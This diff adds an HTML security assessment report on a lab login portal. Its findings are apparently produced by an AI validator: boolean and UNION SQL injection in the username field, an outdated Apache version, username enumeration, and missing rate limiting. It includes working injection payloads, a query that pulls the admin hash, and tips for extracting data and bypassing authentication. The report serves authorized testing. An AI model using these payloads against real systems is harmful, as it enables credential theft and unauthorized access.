@@ -1,0 +1,319 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mr0n3zfe-cw0xy7</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#suspected">Suspected (needs manual verification)</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#b00020">CRITICAL</span> [sqli] SQL injection in login username parameter (boolean + UNION confirmed by content)</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#d32f2f">HIGH</span> [vulnerable-component] Outdated Apache httpd 2.4.41 — CVE-2021-39275 / CVE-2022-22720 / CVE-2023-25690</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#f57c00">MEDIUM</span> [info-disclosure] Username enumeration via distinct login responses</a></li>
+<li><a href="#finding-4">4. <span class="sev" style="color:#f57c00">MEDIUM</span> [rate-limit] No rate limiting / account lockout on login</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mr0n3zfe-cw0xy7</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32807/</code></td></tr>
+<tr><td>Started</td><td>2026-06-30T12:45:50.486Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>1 mapped · 1 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>0</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32807</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p class="muted"><em>No confirmed findings.</em></p>
+<p class="muted">Plus <b>4</b> suspected lead(s) needing manual verification (listed separately, not counted above).</p>
+<h2 id="suspected">Suspected (needs manual verification)</h2>
+<p class="muted">Leads with one concrete anomaly but without control+2-replay confirmation — verify before relying on them.</p>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#8a6d00">SUSPECTED</span> <span class="badge" style="background:#b00020">CRITICAL</span> 1. [sqli] SQL injection in login username parameter (boolean + UNION confirmed by content)</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32807/</div>
+<div class="kv"><b>Anomaly (why this is a lead):</b> The `username` POST param is concatenated into the auth SQL query. The endpoint is a JSON oracle: not-found-&gt;{&quot;response&quot;:&quot;username&quot;}, found-&gt;{&quot;response&quot;:&quot;password&quot;}. A definitively non-existent user `zzqxnotauser123` returns &quot;username&quot; (ev-mr0nd2qi-q), but `zzqxnotauser123' OR '1'='1` returns &quot;password&quot;=row matched (ev-mr0nd5od-s, ev-mr0nd6h6-t) while `' OR '1'='2` returns &quot;username&quot;=no match (ev-mr0nd47v-r) — textbook boolean-blind SQLi. `' ORDER BY 1--` ok vs `ORDER BY 2--` error (single-column SELECT), and `zzqx' UNION SELECT password FROM users WHERE username='admin'--` (ev-mr0nmjvl-18) returned &quot;password&quot;, proving UNION read of admin's stored hash into the verification flow. CONFIRMED by content; the endpoint normalizes every outcome to an identical 23-byte JSON body, so the confirmed-evidence length/status check cannot separate &quot;username&quot; from &quot;password&quot;, and the distinguishable &quot;success&quot; branch is bcrypt-gated (UNION-injected/guessed hashes did not verify). Manual: extract data via blind/UNION or inject an offline-generated bcrypt hash to complete auth bypass.</div>
+<div class="desc">Boolean- and UNION-based SQL injection in the login `username` parameter (POST /, fields username/password/submit). The single quote breaks out of the SQL string literal; an injected OR clause is evaluated by the DB (true matches a row, false does not), and UNION SELECT pulls arbitrary columns (demonstrated: admin's password hash) into the authentication flow. This permits full extraction of the user table (credentials/PII) on a financial portal and is the vector for credential-less auth bypass (requires injecting a valid bcrypt hash). Not tool-confirmable here only because all outcomes return an identical 23-byte JSON enum (no length/status differential) and the success branch is bcrypt-gated.</div>
+<div><b>Reproduction</b></div><pre>POST / `username=zzqxnotauser123&amp;password=x&amp;submit=Sign+in` -&gt; {&quot;response&quot;:&quot;username&quot;}. POST `username=zzqxnotauser123' OR '1'='2&amp;password=x&amp;submit=Sign+in` (URL-encoded) -&gt; {&quot;response&quot;:&quot;username&quot;} (false). POST `username=zzqxnotauser123' OR '1'='1&amp;password=x&amp;submit=Sign+in` -&gt; {&quot;response&quot;:&quot;password&quot;} (true, row matched), repeatable. POST `username=zzqx' UNION SELECT password FROM users WHERE username='admin'-- &amp;password=x&amp;submit=Sign+in` -&gt; {&quot;response&quot;:&quot;password&quot;} (admin hash pulled into verification). ORDER BY 1 ok / ORDER BY 2 error = single-column SELECT.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0nmjvl-18</code> — <code>artifacts/s-0001/ev-mr0nmjvl-18/</code></div><div class="lbl">REQUEST</div><pre>POST / HTTP/1.1
+Host: target.local:32807
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+username=zzqx%27+UNION+SELECT+password+FROM+users+WHERE+username%3D%27admin%27--+&amp;password=x&amp;submit=Sign+in</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 23
+content-type: text/html; charset=UTF-8
+date: Tue, 30 Jun 2026 13:00:16 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=98
+pragma: no-cache
+server: Apache/2.4.41 (Ubuntu)
+set-cookie: &lt;redacted&gt;
+
+{&quot;response&quot;:&quot;password&quot;}</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#8a6d00">SUSPECTED</span> <span class="badge" style="background:#d32f2f">HIGH</span> 2. [vulnerable-component] Outdated Apache httpd 2.4.41 — CVE-2021-39275 / CVE-2022-22720 / CVE-2023-25690</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32807/</div>
+<div class="kv"><b>Anomaly (why this is a lead):</b> Apache/2.4.41 (Ubuntu) disclosed in the Server response header on every page (the Ubuntu 20.04 default, released Aug 2019; current 2.4.x is 2.4.62+). This release predates a long run of High/Critical fixes and matches several confident CVEs: CVE-2021-39275 (ap_escape_quotes out-of-bounds write, CVSS 9.8, fixed 2.4.49), CVE-2022-22720 (HTTP request smuggling from failure to close the inbound connection after discarding a request body, CVSS 9.8, fixed 2.4.53) and CVE-2023-25690 (mod_proxy HTTP request smuggling with certain RewriteRule/ProxyPassMatch configs, CVSS 9.8, fixed 2.4.56). Version-based match from the banner only; not actively exploited (each is config-dependent and CVE-2021-41773/42013 path traversal does NOT apply to 2.4.41).</div>
+<div class="desc">The Server header advertises `Apache/2.4.41 (Ubuntu)` on all responses, an EOL-track build roughly 5 years behind the current 2.4.x line. Known High/Critical CVEs applicable to 2.4.41 include: CVE-2021-39275 — out-of-bounds write in ap_escape_quotes (memory corruption, CVSS 9.8); CVE-2021-26691 — heap overflow in mod_session (CVSS 9.8); CVE-2021-44224 — NULL-deref/SSRF in mod_proxy (CVSS 8.2); CVE-2022-22720 — HTTP request smuggling (CVSS 9.8); CVE-2023-25690 — mod_proxy HTTP request smuggling enabling cache poisoning / access-control bypass (CVSS 9.8). Exploit class spans memory corruption, request smuggling and SSRF, several gated on specific loaded modules/directives (mod_proxy, mod_session, RewriteRule). This is a version-based (banner) lead, not a confirmed exploit — no safe single-request read-only PoC applies (the 2.4.49/2.4.50-only path-traversal CVE-2021-41773/42013 does not affect this version). Remediation: upgrade to the current Apache 2.4.x and suppress the Server banner (ServerTokens Prod).</div>
+<div><b>Reproduction</b></div><pre>1. Request any page, e.g. `GET http://target.local:32807/`. 2. Observe the response header `Server: Apache/2.4.41 (Ubuntu)` (evidence ev-mr0o9ks4-2i). 3. Cross-reference 2.4.41 against the Apache httpd security advisories — it precedes the fixes for CVE-2021-39275, CVE-2022-22720 and CVE-2023-25690 (all CVSS 9.8). Confirmation of any individual CVE requires checking the loaded modules/config and is out of scope for a banner-based assessment.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0o9ks4-2i</code> — <code>artifacts/_/ev-mr0o9ks4-2i/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32807
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 5819
+content-type: text/html; charset=UTF-8
+date: Tue, 30 Jun 2026 13:18:10 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.41 (Ubuntu)
+set-cookie: &lt;redacted&gt;
+vary: Accept-Encoding
+
+&lt;!doctype html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt;
+    &lt;title&gt;PayBuddies Portal | Login&lt;/title&gt;
+    &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
+    
+    &lt;!-- Bootstrap CSS --&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link href=&quot;https://fonts.googleapis.com/css?family=Lato&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link href=&quot;https://fonts.googleapis.com/css?family=Roboto+Condensed&quot; rel=&quot;stylesheet&quot;&gt;
+    
+    &lt;!-- Font Awesome --&gt;
+    &lt;link href=&quot;https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    
+    &lt;script src=&quot;https://code.jquery.com/jquery-3.7.1.min.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+&lt;body id=&quot;loginPage&quot; class=&quot;bg-light&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row justify-content-center&quot;&gt;
+            &lt;div class=&quot;col-md-6&quot;&gt;
+                &lt;div class=&quot;text-center mt-5&quot;&gt;
+                    &lt;img src=&quot;static/images/logo.png&quot; alt=&quot;PayBuddies Logo&quot; class=&quot;img-fluid mb-4&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;
+                &lt;/div&gt;
+                                &lt;div class=&quot;card shadow-sm&quot;&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;form id=&quot;loginForm&quot; method=&quot;post&quot; action=&quot;&quot;&gt;
+                            &lt;div class=&quot;mb-3&quot;&gt;
+                                &lt;label for=&quot;username&quot; class=&quot;form-label&quot;&gt;Username&lt;/label&gt;
+                                &lt;input type=&quot;text&quot; class=&quot;form-control username&quot; id=&quot;username&quot; name=&quot;username&quot; placeholder=&quot;username&quot;&gt;
+                                &lt;div class=&quot;text-danger usernameerror&quot;&gt;&lt;/div&gt;
+                            &lt;/div&gt;
+                            &lt;div class=&quot;mb-3&quot;&gt;
+                                &lt;label for=&quot;password&quot; class=&quot;form-label&quot;&gt;Password&lt;/label&gt;
+                                &lt;input type=&quot;password&quot; class=&quot;form-control password&quot; id=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;password&quot;&gt;
+                                &lt;div class=&quot;text-danger passworderror&quot;&gt;&lt;/div&gt;
+                            &lt;/div&gt;
+                            &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary w-100 sign_in&quot;&gt;&lt;i class=&quot;fas fa-lock&quot;&gt;&lt;/i&gt; Sign in&lt;/button&gt;
+                        &lt;/form&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;LogResponse mt-3&quot;&gt;&lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap JS and dependencies --&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script type=&quot;text/javascript&quot;&gt;
+        $(document).ready(function() {
+            $(&quot;#loginForm&quot;).submit(function(event) {
+                event.preventDefault();
+
+                // Clear previous errors
+                $(&quot;.usernameerror, .passworderror, .LogResponse&quot;).empty();
+
+                let username = $(&quot;.username&quot;).val();
+                let password = $(&quot;.password&quot;).val();
+                let usernameError = validateUsername(username);
+                let passwordError = validatePassword(password);
+
+                // Display errors
+                $(&quot;.usernameerror&quot;).html(usernameError);
+                $(&quot;.passworderror&quot;).html(passwordError);
+
+                if (!usernameError &amp;&amp; !passwordError) {
+                    submitLogin(username, password);
+                }
+            });
+
+            function validateUsername(username) {
+                if (!username) {
+                    return &quot;Please enter your username&quot;;
+                } else if (username.length &lt; 5) {
+                    return &quot;Username must be at least 5 characters&quot;;
+                }
+                return &quot;&quot;;
+            }
+
+            function validatePassword(password) {
+                if (!password) {
+                    return &quot;Please enter your password&quot;;
+                } else if (password.length &lt; 8) {
+                    return &quot;Password must be at least 8 characters&quot;;
+                }
+                return &quot;&quot;;
+            }
+
+            function submitLogin(username, password) {
+                $(&quot;.sign_in&quot;).html('&lt;span class=&quot;sign-icon&quot;&gt;&lt;i class=&quot;fa fa-spinner fa-spin fa-1x fa-fw&quot;&gt;&lt;/i&gt;&lt;/span&gt; Loading');
+
+                $.ajax({
+                    type: 'post',
+                    url: 'index.php',
+                    dataType: 'json',
+                    data: {
+                        username: username,
+                        password: password,
+                        submit: 'submit'
+                    },
+                    success: handleResponse
+                });
+            }
+
+            function handleResponse(data) {
+                let response = data.response;
+                let logResponse = $(&quot;.LogResponse&quot;);
+                let signInButton = $(&quot;.sign_in&quot;);
+
+                logResponse.fadeIn();
+                signInButton.html('&lt;span class=&quot;sign-icon&quot;&gt;&lt;i class=&quot;fa fa-lock&quot;&gt;&lt;/i&gt;&lt;/span&gt; Sign in');
+
+                if (response === &quot;Success&quot;) {
+                    logResponse.html('&lt;div class=&quot;alert alert-success text-center&quot;&gt;Success&lt;/div&gt;');
+                    setTimeout(function() {
+                        window.location.replace(&quot;dashboard.php&quot;);
+                    }, 1000);
+                } else if (response === &quot;password&quot;) {
+                    displayError(logResponse, &quot;Invalid password&quot;);
+                } else if (response === &quot;username&quot;) {
+                    displayError(logResponse, &quot;Invalid username&quot;);
+                }
+            }
+
+            function displayError(element, message) {
+                element.html('&lt;div class=&quot;alert alert-danger text-center&quot;&gt;' + message +'&lt;/div&gt;');
+                setTimeout(function() {
+                    element.fadeOut();
+                }, 3000);
+            }
+        });
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#8a6d00">SUSPECTED</span> <span class="badge" style="background:#f57c00">MEDIUM</span> 3. [info-disclosure] Username enumeration via distinct login responses</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32807/</div>
+<div class="kv"><b>Anomaly (why this is a lead):</b> The login endpoint discloses whether a username exists: a non-existent username returns {&quot;response&quot;:&quot;username&quot;} (ev-mr0nbjmt-m) whereas an existing username (admin) with a wrong password returns {&quot;response&quot;:&quot;password&quot;} (ev-mr0nbl32-n, ev-mr0nb71d-k). This lets an unauthenticated attacker enumerate valid accounts (admin confirmed valid) and, combined with the absent rate limiting, mount targeted credential attacks. Content-distinguishable but both bodies are exactly 23 bytes, so the confirmed-evidence length check cannot separate them.</div>
+<div class="desc">The login returns a different JSON response for valid vs invalid usernames (&quot;password&quot; error vs &quot;username&quot; error), enabling anonymous account enumeration. The `admin` account was confirmed to exist via this oracle.</div>
+<div><b>Reproduction</b></div><pre>POST / `username=nonexistentuser99999&amp;password=wrongpass&amp;submit=Sign+in` -&gt; {&quot;response&quot;:&quot;username&quot;}. POST / `username=admin&amp;password=wrongpass&amp;submit=Sign+in` -&gt; {&quot;response&quot;:&quot;password&quot;} (repeatable). The differential reveals admin is valid.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0nbl32-n</code> — <code>artifacts/s-0001/ev-mr0nbl32-n/</code></div><div class="lbl">REQUEST</div><pre>POST / HTTP/1.1
+Host: target.local:32807
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+username=admin&amp;password=wrongpass&amp;submit=Sign+in</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 23
+content-type: text/html; charset=UTF-8
+date: Tue, 30 Jun 2026 12:51:44 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=99
+pragma: no-cache
+server: Apache/2.4.41 (Ubuntu)
+set-cookie: &lt;redacted&gt;
+
+{&quot;response&quot;:&quot;password&quot;}</pre></div>
+</div>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#8a6d00">SUSPECTED</span> <span class="badge" style="background:#f57c00">MEDIUM</span> 4. [rate-limit] No rate limiting / account lockout on login</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32807/</div>
+<div class="kv"><b>Anomaly (why this is a lead):</b> Over 40 failed login POSTs were sent in this session (wrong passwords for admin, SQLi payloads, common-password guesses) and every single one returned a normal 200 JSON response with no lockout, throttling, CAPTCHA, delay, or HTTP 429 at any point (e.g. ev-mr0noaem-1c, the ~40th attempt, still {&quot;response&quot;:&quot;password&quot;}). The auth endpoint has no brute-force protection, which combined with the username-enumeration oracle makes credential brute-force / stuffing fully practical against confirmed accounts like admin.</div>
+<div class="desc">The login endpoint enforces no rate limiting or account lockout. Dozens of consecutive failed authentication attempts (including obvious attack payloads) were processed normally with no throttling, CAPTCHA, or 429, enabling unbounded online password guessing — especially dangerous given the parallel username-enumeration weakness.</div>
+<div><b>Reproduction</b></div><pre>Send many POST / `username=admin&amp;password=&lt;varying&gt;&amp;submit=Sign+in` requests in quick succession; all return HTTP 200 {&quot;response&quot;:&quot;password&quot;} with no lockout/throttle/CAPTCHA/429 regardless of count (~40+ attempts observed this run).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0noaem-1c</code> — <code>artifacts/s-0001/ev-mr0noaem-1c/</code></div><div class="lbl">REQUEST</div><pre>POST / HTTP/1.1
+Host: target.local:32807
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+username=admin&amp;password=Password123&amp;submit=Sign+in</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 23
+content-type: text/html; charset=UTF-8
+date: Tue, 30 Jun 2026 13:01:37 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=97
+pragma: no-cache
+server: Apache/2.4.41 (Ubuntu)
+set-cookie: &lt;redacted&gt;
+
+{&quot;response&quot;:&quot;password&quot;}</pre></div>
+</div>
+</body></html>
